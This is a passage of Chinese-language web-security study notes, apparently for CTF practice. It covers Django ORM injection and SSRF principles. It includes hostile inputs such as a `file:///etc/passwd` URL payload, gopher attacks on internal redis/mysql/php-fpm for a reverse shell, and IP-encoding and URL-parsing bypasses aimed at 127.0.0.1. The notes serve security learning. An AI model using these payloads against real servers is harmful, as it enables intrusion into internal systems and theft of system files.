同时我们应该知道，Python3运行文件时，运行的模块会进行缓存，存放在`__pycache__`的目录下，其中文件的命名规则为`[module_name].cpython-[小版本号].pyc`，我们可以通过[反编译软件](https://github.com/rocky/python-uncompyle6)对其中的代码进行反编译，就可以进行代码审计了

同时注意到Django在与数据库进行交互的过程中预先预设了很多不同的简化SQL指令供我们调用，比如有一个`filter(**kargs)`[方法](https://docs.djangoproject.com/en/4.0/ref/models/querysets/#filter)类似一个筛选条件，里面可以包含某些条件，用于从数据库中筛选出我们指定的内容，但是我们也可以通过自己构造payload来实现查找自定义的内容

> Django中，SQL语句的符号全部是通过参数名后面的一些关键词实现的。举个最简单的例子，查询“在User表里查询age大于30的所有用户”，这里可以写作`User.objects.filter(age__gt=30).all()`，其中下划线分隔指令，比如这里面`age`就是表名，`gt`是[关键词参数](https://docs.djangoproject.com/en/1.10/ref/models/querysets/#gt)，可以查阅相关文档

利用这个特性可以实现ORM注入

## SSRF

SSRF就是用户通过构造程序，利用服务端内部向内网服务器或系统发起请求的漏洞

### 原理

URL的结构是`scheme:[//authority]path[?query][#fragment]`，其中

- scheme代表请求该资源使用的协议，注意除了`http(s)`之外还有很多不同协议
- authority由三部分组成`[userinfo@][host][:port]`，其中userinfo表示表示访问该资源需要的用户信息，格式为`username:password`，不过一般来说比如`http`协议大多都是匿名形式访问数据的
- path是指向资源的路径，一般用`/`分隔
- query表示查询的内容参数，会被发到服务端服务端对其中内容进行解析之后返回特定内容给用户
- fragment表示片段ID，与query不同的是它不会被传递到服务端，一般表示页面的锚点

其中最重要的内容就是sheme部分，比如某个页面存在`?url=https://www.baidu.com`那么我们就可以将他改为比如`?url=file:///etc/passwd`来访问服务器内容资源

同时由于大多数SSRF漏洞的请求内容都是比如网络中的图片等，因此对于服务器文件我们需要`curl`来控制台访问内容

### 攻击方式

但是在实际情况中一般并不会如上面说的直接给你`file://`协议那么简单，对于进行了不完全过滤的SSRF攻击，我认为有以下几个步骤

1. 通过脚本探测访问自己和子网下开放的敏感端口如`192.168.80.x:xxxx`，同时可能限制了协议要求，因此这个办法可以找到内网中开放的服务器
2. 构造伪装请求包信息，比如在服务器下存在mysql，mysql的特性是只允许本机访问，因此我们可以在本地测试服务环境，通过tcpdump等方式抓包，解析包内容，构造请求参数
3. 利用`gopher`协议进行攻击，其中`gopher`协议是在http协议之前的过时协议，现在一般都用来进行SSRF攻击

其中对于服务器部署的不同资源内容，我们可以获取到不同的信息

- redis可以让我们注入crontab从而反弹shell
- mysql可以执行任意增删改查操作
- php-fpm可以执行系统任意命令等

### 绕过

- 用各种奇怪的符号代替数字或字母，比如`①②⑦。⓪。⓪。①`句号和Enclosed alphanumeric数字包裹符都可（一般用于前端绕过）

  ![image-20220306160017741](https://s2.loli.net/2022/03/06/pjxc2uS6CGKqnaT.png)

- 对IP地址进行编码绕过，首先将比如`127.0.0.1`变成`127 0 0 1`，接着以空格为界限将其中的每一位转化为16进制`7f 00 00 01`注意一位0转化为两位16进制数，我们就得到了16进制，接着再对每一位取八进制，就得到了八进制`177 00 00 01`，其中十六进制前用0x标识，八进制用若干0标识

  ![image-20220306170550996](https://s2.loli.net/2022/03/06/NLbk5K1xmdUMRl2.png)

- DNS/短网址跳转，我们可以在自己的域名中新建A记录，将ip设为127.0.0.1，然后访问我们自己的域名即可，或者利用某些服务如`xip.io`，用`127.0.0.1.xip.io`访问时会自动转发到`127.0.0.1`

- 利用省略机制，比如`http://0`在linux上表示`127.0.0.1`，同时和ipv6一样，`http://127.1`省略中间0也能访问


### 相关函数

- `parse_url`可以把url的各部分拆出来，相关部分可以看上面的内容

  ![image-20220308210439011](https://s2.loli.net/2022/03/08/2sV5UL6DFyinHeo.png)

  > 注意`parse_url`和`curl_exec`获得host的方式不一样，比如有`http://a@127.0.0.1:80@baidu.com`，那么parse_url会取`baidu.com`为host，前面的内容`a@127.0.0.1`为user，`80`为pass，而`curl_exec`则会取第一个a为user，而`127.0.0.1`为host，这就导致了ip的绕过注入

- `gethostbyname`可以根据上面提取出来的host根据DNS取得域名的IP

- `ip2long`可以根据正常的ip再用前面的方式变成10进制的ip

  
